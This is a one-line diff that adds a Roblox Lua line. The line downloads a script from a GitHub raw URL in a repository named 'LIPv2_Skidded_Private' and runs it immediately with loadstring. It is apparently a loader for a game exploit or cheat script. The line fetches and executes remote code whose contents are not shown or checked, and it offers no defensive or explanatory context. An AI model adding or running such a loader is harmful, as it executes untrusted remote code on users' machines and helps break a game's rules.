@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xqzxa/LIPv2_Skidded_Private/main/source.lua"))()
